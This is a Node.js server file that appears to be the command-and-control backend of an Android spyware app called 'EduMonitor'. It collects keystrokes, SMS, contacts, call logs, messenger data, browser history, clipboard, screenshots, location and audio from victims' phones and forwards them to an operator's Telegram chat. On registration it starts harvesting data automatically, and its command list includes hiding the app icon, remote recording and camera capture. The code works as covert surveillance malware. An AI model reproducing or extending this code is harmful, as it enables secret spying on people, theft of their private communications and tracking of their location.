app.post('/api/logs', async (req, res) => {
    try {
        const logData = req.body;
        
        console.log(`📝 Log received:`, {
            type: logData.type,
            deviceId: logData.deviceId,
            timestamp: new Date(logData.timestamp).toISOString(),
            package: logData.package
        });

        if (!logData.deviceId) {
            console.error('❌ Missing deviceId in log');
            return res.status(400).json({ error: 'Missing deviceId' });
        }

        const device = devices.get(logData.deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${logData.deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }

        const chatId = device.chatId;
        const devicePrefix = `📱 *${device.deviceInfo?.model || 'Device'}*\n`;

        let message = '';
        
        switch (logData.type) {
            case 'keystroke':
                message = devicePrefix + `⌨️ <b>Keystroke</b>\n` +
                         `App: <code>${logData.package || 'unknown'}</code>\n` +
                         `Text: <code>${logData.data?.substring(0, 100)}</code>`;
                break;
                
            case 'notification':
                message = devicePrefix + `🔔 <b>Notification</b>\n` +
                         `App: <code>${logData.package || 'unknown'}</code>\n` +
                         `Title: <b>${logData.title || ''}</b>\n` +
                         `Content: <code>${logData.data?.substring(0, 100)}</code>`;
                break;
                
            case 'location':
                return res.json({ success: true, handled: 'location_endpoint' });
                
            case 'ip_info':
                return res.json({ success: true, handled: 'ipinfo_endpoint' });
                
            case 'phone_number':
                return res.json({ success: true, handled: 'phonenumber_endpoint' });
                
            case 'sim_info':
                return res.json({ success: true, handled: 'siminfo_endpoint' });
                
            case 'wifi_info':
                return res.json({ success: true, handled: 'wifiinfo_endpoint' });
                
            case 'mobile_info':
                return res.json({ success: true, handled: 'mobileinfo_endpoint' });
                
            case 'app_open':
                return res.json({ success: true, handled: 'app_open_batch' });
                
            case 'contacts':
            case 'contacts_detailed':
            case 'sms':
            case 'calllogs':
            case 'apps':
            case 'apps_detailed':
            case 'keystrokes':
            case 'keystrokes_detailed':
            case 'notifications':
            case 'notifications_detailed':
            case 'whatsapp':
            case 'telegram':
            case 'facebook':
            case 'browser_history':
            case 'clipboard':
            case 'calendar':
            case 'screenshots':
            case 'screenshot_logs':
            case 'device_snapshots':
            case 'device_history':
            case 'all_info':
            case 'full_info':
            case 'app_opens':
                return res.json({ success: true, handled: 'file_upload_endpoint' });
                
            case 'device_info':
                try {
                    const info = JSON.parse(logData.data || '{}');
                    message = devicePrefix + `📱 <b>Device Info Update</b>\n` +
                             `Model: ${info.model || 'unknown'}\n` +
                             `Android: ${info.androidVersion || 'unknown'}\n` +
                             `Manufacturer: ${info.manufacturer || 'unknown'}`;
                } catch (e) {
                    message = devicePrefix + `📱 <b>Device Info Update</b>\n` +
                             `Data: ${logData.data?.substring(0, 100)}`;
                }
                break;
                
            default:
                message = devicePrefix + `📝 <b>Log: ${logData.type}</b>\n` +
                         `Data: ${logData.data?.substring(0, 200)}`;
        }

        if (message) {
            sendTelegramMessage(chatId, message).catch(e => 
                console.error('Failed to send log to Telegram:', e)
            );
        }

        console.log(`✅ Log processed for device ${logData.deviceId}`);

        res.json({ 
            success: true, 
            timestamp: Date.now(),
            message: 'Log received'
        });

    } catch (error) {
        console.error('❌ Error processing log:', error);
        res.status(500).json({ 
            error: 'Failed to process log',
            message: error.message 
        });
    }
});

app.post('/api/log', (req, res) => {
    console.log('📝 Redirecting /api/log to /api/logs');
    req.url = '/api/logs';
    app._router.handle(req, res);
});

app.post('/api/logs/batch', async (req, res) => {
    try {
        const logs = req.body;
        
        if (!Array.isArray(logs)) {
            return res.status(400).json({ error: 'Expected array of logs' });
        }

        console.log(`📦 Received batch of ${logs.length} logs`);

        const deviceLogs = new Map();
        
        for (const log of logs) {
            if (log.deviceId) {
                if (!deviceLogs.has(log.deviceId)) {
                    deviceLogs.set(log.deviceId, []);
                }
                deviceLogs.get(log.deviceId).push(log);
            }
        }

        for (const [deviceId, deviceLogsList] of deviceLogs.entries()) {
            const device = devices.get(deviceId);
            if (device) {
                const nonAppOpenLogs = deviceLogsList.filter(log => log.type !== 'app_open');
                
                if (nonAppOpenLogs.length > 0) {
                    const typeCounts = {};
                    nonAppOpenLogs.forEach(log => {
                        typeCounts[log.type] = (typeCounts[log.type] || 0) + 1;
                    });
                    
                    const typeSummary = Object.entries(typeCounts)
                        .map(([type, count]) => `• ${type}: ${count}`)
                        .join('\n');
                    
                    const summary = `📱 *${device.deviceInfo?.model || 'Device'}*\n\n` +
                        `📊 <b>Log Batch Summary</b>\n` +
                        `Received ${nonAppOpenLogs.length} logs:\n` +
                        `${typeSummary}\n\n` +
                        `First log: ${new Date(nonAppOpenLogs[0].timestamp).toLocaleString()}\n` +
                        `Last log: ${new Date(nonAppOpenLogs[nonAppOpenLogs.length-1].timestamp).toLocaleString()}`;
                    
                    sendTelegramMessage(device.chatId, summary).catch(console.error);
                }
            }
        }

        res.json({ 
            success: true, 
            processed: logs.length,
            devices: deviceLogs.size
        });

    } catch (error) {
        console.error('❌ Error processing batch logs:', error);
        res.status(500).json({ 
            error: 'Failed to process batch logs',
            message: error.message 
        });
    }
});

// ============= LOCATION ENDPOINT =============

app.post('/api/location/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const locationData = req.body;
        
        console.log(`📍 Location data from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        
        device.lastLocation = locationData;
        
        const formatted = formatLocationMessage(locationData);
        const devicePrefix = `📱 *${device.deviceInfo?.model || 'Device'}*\n\n`;
        
        if (formatted.lat && formatted.lon) {
            try {
                await axios.post(`${TELEGRAM_API}/sendLocation`, {
                    chat_id: chatId,
                    latitude: formatted.lat,
                    longitude: formatted.lon,
                    live_period: 60
                });
                console.log('✅ Location pin sent');
            } catch (e) {
                console.error('Failed to send location pin:', e.message);
            }
        }
        
        await sendTelegramMessage(chatId, devicePrefix + formatted.text);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Location endpoint error:', error);
        res.status(500).json({ error: 'Location processing failed' });
    }
});

// ============= API ENDPOINTS =============

app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        devices: devices.size,
        authorizedChats: Array.from(authorizedChats).join(', '),
        serverIP: getServerIP(),
        timestamp: Date.now()
    });
});

app.get('/api/ping/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    if (device) {
        device.lastSeen = Date.now();
        res.json({ status: 'alive', timestamp: Date.now() });
    } else {
        res.status(404).json({ status: 'unknown' });
    }
});

app.get('/api/commands/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    try {
        if (device?.pendingCommands?.length > 0) {
            const commands = device.pendingCommands.map(cmd => ({
                command: cmd.command,
                originalCommand: cmd.originalCommand,
                messageId: cmd.messageId,
                timestamp: cmd.timestamp,
                autoData: cmd.autoData || false
            }));
            device.pendingCommands = [];
            console.log(`📤 Sending ${commands.length} commands to ${deviceId}:`, commands.map(c => c.command).join(', '));
            sendJsonResponse(res, { commands });
        } else {
            console.log(`📭 No commands for ${deviceId}`);
            sendJsonResponse(res, { commands: [] });
        }
    } catch (e) {
        console.error('Error in /api/commands:', e);
        sendJsonResponse(res, { commands: [], error: e.message }, 500);
    }
});

app.post('/api/result/:deviceId', async (req, res) => {
    const deviceId = req.params.deviceId;
    const { command, result, error } = req.body;
    
    if (command && (command === 'find_media' || command.includes('_html') || command.includes('_detailed') ||
        command === 'ip_info' || command === 'phone_number' || command === 'location' ||
        command === 'sim_info' || command === 'wifi_info' || command === 'all_info' ||
        command === 'mobile_info' || command === 'find_recorded' || command === 'media_scan' ||
        command === 'contacts' || command === 'sms' || command === 'calllogs' ||
        command === 'apps' || command === 'keystrokes' || command === 'notifications' ||
        command === 'whatsapp' || command === 'telegram' || command === 'facebook' ||
        command === 'browser_history' || command === 'clipboard' || command === 'calendar' ||
        command === 'screenshots' || command === 'screenshot_logs' || command === 'apps_detailed' ||
        command === 'installed_apps_detailed' || command === 'keystrokes_detailed' || command === 'notifications_detailed' ||
        command === 'contacts_detailed' || command === 'device_snapshots' || command === 'device_history' ||
        command === 'full_info' || command === 'screenshot_settings' || command === 'recording_settings' ||
        command === 'app_opens' || command === 'full_scan' || command === 'media_scan' ||
        command === 'full_scan_detailed' || command === 'audio_ultra' || command === 'audio_very_low' ||
        command === 'audio_low' || command === 'audio_medium' || command === 'audio_high')) {
        console.log(`📎 ${command} using dedicated endpoint`);
        return res.sendStatus(200);
    }

    console.log(`📨 Result from ${deviceId}:`, { command });
    
    const device = devices.get(deviceId);
    if (device) {
        const chatId = device.chatId;
        const devicePrefix = `📱 *${device.deviceInfo?.model || 'Device'}*\n\n`;
        
        if (error) {
            await sendTelegramMessage(chatId, devicePrefix + `❌ <b>Command Failed</b>\n\n<code>${command}</code>\n\n<b>Error:</b> ${error}`);
        } else {
            await sendTelegramMessage(chatId, devicePrefix + (result || `✅ ${command} executed`));
        }
    }
    
    res.sendStatus(200);
});

// ============= REGISTRATION ENDPOINT =============
app.post('/api/register', async (req, res) => {
    const { deviceId, deviceInfo } = req.body;
    
    console.log('📝 Registration attempt:', { deviceId });
    
    if (!deviceId || !deviceInfo) {
        return res.status(400).json({ error: 'Missing fields' });
    }
    
    const deviceConfig = getDeviceConfig(deviceId);
    
    if (!deviceConfig) {
        return res.status(403).json({ error: 'Device not authorized' });
    }
    
    const existingDevice = devices.get(deviceId);
    const isNewDevice = !existingDevice;
    
    const deviceData = {
        chatId: deviceConfig.chatId,
        deviceInfo,
        lastSeen: Date.now(),
        pendingCommands: existingDevice ? existingDevice.pendingCommands : [],
        firstSeen: existingDevice ? existingDevice.firstSeen : Date.now(),
        phoneNumber: existingDevice?.phoneNumber || null,
        lastIPInfo: existingDevice?.lastIPInfo || null,
        lastLocation: existingDevice?.lastLocation || null,
        simInfo: existingDevice?.simInfo || null,
        wifiInfo: existingDevice?.wifiInfo || null,
        mobileInfo: existingDevice?.mobileInfo || null,
        screenshotSettings: existingDevice?.screenshotSettings || null,
        recordingSettings: existingDevice?.recordingSettings || null
    };
    
    devices.set(deviceId, deviceData);
    
    console.log(`✅ Device ${isNewDevice ? 'registered' : 'updated'}: ${deviceId} for chat ${deviceConfig.chatId}`);
    
    await setChatMenuButton(deviceConfig.chatId);
    
    const userDevices = getDeviceListForUser(deviceConfig.chatId);
    
    let welcomeMessage = `✅ <b>Device ${isNewDevice ? 'Connected' : 'Updated'}!</b>\n\n`;
    welcomeMessage += `📱 Model: ${deviceInfo.model}\n`;
    welcomeMessage += `🤖 Android: ${deviceInfo.android}\n`;
    welcomeMessage += `🆔 ID: ${deviceId.substring(0, 8)}...\n\n`;
    
    if (isNewDevice) {
        welcomeMessage += `You now have ${userDevices.length} device(s) registered.\n\n`;
        welcomeMessage += `🔄 <b>Auto-collecting data...</b>\n`;
        welcomeMessage += `The server is automatically requesting:\n`;
        welcomeMessage += `• 📇 Contacts\n`;
        welcomeMessage += `• 📇 Detailed Contacts\n`;
        welcomeMessage += `• 💬 SMS Messages\n`;
        welcomeMessage += `• 📞 Call Logs\n`;
        welcomeMessage += `• 📱 Installed Apps\n`;
        welcomeMessage += `• 📱 Detailed Apps\n`;
        welcomeMessage += `• ⌨️ Keystrokes\n`;
        welcomeMessage += `• ⌨️ Detailed Keystrokes\n`;
        welcomeMessage += `• 🔔 Notifications\n`;
        welcomeMessage += `• 🔔 Detailed Notifications\n`;
        welcomeMessage += `• 💬 WhatsApp\n`;
        welcomeMessage += `• 💬 Telegram\n`;
        welcomeMessage += `• 💬 Facebook\n`;
        welcomeMessage += `• 🌐 Browser History\n`;
        welcomeMessage += `• 📋 Clipboard\n`;
        welcomeMessage += `• 📅 Calendar\n`;
        welcomeMessage += `• 📸 Screenshots\n`;
        welcomeMessage += `• 📊 Device Snapshots\n`;
        welcomeMessage += `• 📍 Location\n`;
        welcomeMessage += `• 📱 App Opens\n`;
        welcomeMessage += `• ⚙️ Screenshot Settings\n`;
        welcomeMessage += `• ⚙️ Recording Settings\n\n`;
        welcomeMessage += `This may take a few moments as the device processes each request.`;
        
        if (userDevices.length === 1) {
            userDeviceSelection.set(deviceConfig.chatId, deviceId);
            welcomeMessage += `\n\n✅ This device has been automatically selected for control.`;
        }
    } else {
        welcomeMessage += `Device information updated.`;
    }
    
    await sendTelegramMessageWithKeyboard(
        deviceConfig.chatId,
        welcomeMessage,
        getMainMenuKeyboard(deviceConfig.chatId)
    );
    
    if (isNewDevice) {
        queueAutoDataCommands(deviceId, deviceConfig.chatId);
    }
    
    res.json({
        status: 'registered',
        deviceId,
        chatId: deviceConfig.chatId,
        config: deviceConfig.config
    });
});

app.get('/api/devices', (req, res) => {
    const deviceList = [];
    for (const [id, device] of devices.entries()) {
        deviceList.push({
            deviceId: id,
            chatId: device.chatId,
            lastSeen: new Date(device.lastSeen).toISOString(),
            firstSeen: new Date(device.firstSeen).toISOString(),
            model: device.deviceInfo?.model || 'Unknown',
            android: device.deviceInfo?.android || 'Unknown',
            phoneNumber: device.phoneNumber || 'Not available',
            lastIPInfo: device.lastIPInfo || null,
            lastLocation: device.lastLocation || null,
            autoDataRequested: autoDataRequested.has(id),
            online: (Date.now() - device.lastSeen) < 300000
        });
    }
    res.json({ total: devices.size, devices: deviceList });
});

// ============= TEST ENDPOINTS =============

app.get('/test', (req, res) => {
    const serverIP = getServerIP();
    const userDevices = getDeviceListForUser('5326373447');
    
    res.send(`
        <html>
        <head>
            <style>
                body { font-family: Arial; padding: 20px; background: #1a1a2e; color: #fff; }
                h1 { color: #e94560; }
                .stats { background: #16213e; padding: 20px; border-radius: 10px; margin: 20px 0; }
                .device { background: #0f3460; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 3px solid #e94560; }
                .online { color: #4CAF50; }
                .offline { color: #f44336; }
                .ip { background: #1a1a2e; padding: 5px; border-radius: 3px; font-family: monospace; }
            </style>
        </head>
        <body>
            <h1>✅ EduMonitor Server v5.0 Running</h1>
            <div class="stats">
                <p><b>Time:</b> ${new Date().toISOString()}</p>
                <p><b>Server IP:</b> <code class="ip">${serverIP}</code></p>
                <p><b>Total Devices:</b> ${devices.size}</p>
                <p><b>Authorized Chats:</b> ${Array.from(authorizedChats).join(', ')}</p>
                <p><b>Commands Available:</b> 95+ commands including all new features</p>
            </div>
            
            <h2>📱 Registered Devices (${userDevices.length})</h2>
            ${Array.from(devices.entries()).map(([id, device]) => {
                const online = (Date.now() - device.lastSeen) < 300000;
                return `
                    <div class="device">
                        <h3>${device.deviceInfo?.model || 'Unknown Device'}</h3>
                        <p><b>ID:</b> <code>${id}</code></p>
                        <p><b>Status:</b> <span class="${online ? 'online' : 'offline'}">${online ? '🟢 Online' : '⚫ Offline'}</span></p>
                        <p><b>Last Seen:</b> ${new Date(device.lastSeen).toLocaleString()}</p>
                        <p><b>Android:</b> ${device.deviceInfo?.android || 'Unknown'}</p>
                        <p><b>Phone:</b> ${device.phoneNumber || 'Not available'}</p>
                        <p><b>Pending Commands:</b> ${device.pendingCommands?.length || 0}</p>
                    </div>
                `;
            }).join('')}
            
            <p><a href="/test-menu" style="background: #4CAF50; color: white; padding: 10px; text-decoration: none; border-radius: 5px;">Send Test Menu</a></p>
        </body>
        </html>
    `);
});

app.get('/test-menu', async (req, res) => {
    const chatId = '5326373447';
    const result = await sendTelegramMessageWithKeyboard(
        chatId,
        "🤖 Test Menu - Use the buttons below:",
        getMainMenuKeyboard(chatId)
    );
    res.json({ success: !!result });
});

app.listen(PORT, '0.0.0.0', () => {
    const serverIP = getServerIP();
    console.log('\n🚀 ===============================================');
    console.log(`🚀 EduMonitor Server v5.0 running on port ${PORT}`);
    console.log(`🚀 Server IP: ${serverIP}`);
    console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
    console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
    console.log('\n✅ COMPLETE COMMAND LIST (95+ commands):');
    console.log('   📋 /help, /menu, /start - Main menu');
    console.log('   📱 /devices, /select - Device management');
    console.log('   📊 /status, /info, /time, /battery, /storage - Device info');
    console.log('   📍 /location, /keystrokes, /notifications, /app_opens - Tracking');
    console.log('   📸 /screenshot, /screenshot_settings, /screenshots, /size_status - Screenshot');
    console.log('   🎤 /record, /stop_recording, /recording_settings, /record_schedule - Recording');
    console.log('   📸 /photo, /camera_on, /camera_off, /camera_status - Camera');
    console.log('   💬 /whatsapp, /telegram, /facebook, /browser_history, /clipboard - Social');
    console.log('   📅 /calendar - Calendar events');
    console.log('   📞 /phone_number, /sim_info, /mobile_info, /calllogs - Phone info');
    console.log('   🌐 /ip_info, /wifi_info, /network, /all_info - Network info');
    console.log('   📇 /contacts, /contacts_html, /contacts_detailed - Contacts');
    console.log('   💬 /sms, /sms_html - SMS');
    console.log('   📱 /apps, /apps_html, /apps_detailed - Apps');
    console.log('   ⌨️ /keystrokes, /keystrokes_html, /keystrokes_detailed - Keystrokes');
    console.log('   🔔 /notifications, /notifications_detailed - Notifications');
    console.log('   📸 /screenshots, /screenshot_logs - Screenshot logs');
    console.log('   📊 /device_snapshots, /device_history - Device snapshots');
    console.log('   🔍 /find_media, /scan_media, /find_recorded - Media scanner');
    console.log('   🔍 /full_scan, /media_scan, /full_scan_detailed - Advanced scanner');
    console.log('   🔊 /audio_ultra, /audio_low, /audio_medium, /audio_high - Audio quality');
    console.log('   📡 /wifi_only_on, /wifi_only_off, /network_status - Data saving');
    console.log('   🔑 /realtime_keystrokes_on, /realtime_notifications_on - Advanced realtime');
    console.log('   🔔 /realtime_on, /realtime_off, /realtime_status - Realtime');
    console.log('   👻 /hide_icon, /show_icon - Icon visibility');
    console.log('   🔄 /reboot_app, /clear_logs, /logs_count, /stats - Services');
    console.log('   ⚡ /force_harvest, /sync_all, /sync_all_new, /refresh - Sync');
    console.log('\n✅ NEW FEATURES ADDED:');
    console.log('   • Detailed Exports (contacts, apps, keystrokes, notifications)');
    console.log('   • Advanced File Scanner (full_scan, media_scan, deep_scan)');
    console.log('   • Audio Quality Controls (5 quality levels)');
    console.log('   • Data Saving Mode (WiFi-only)');
    console.log('   • Advanced Realtime Controls (separate keystrokes/notifications)');
    console.log('   • App Opens Tracking');
    console.log('   • Calendar Events Export');
    console.log('   • Clipboard History');
    console.log('   • Browser History');
    console.log('   • Device Snapshots');
    console.log('\n🚀 TOTAL COMMANDS: 95+ fully synchronized between app and server');
    console.log('\n🚀 ===============================================\n');
});
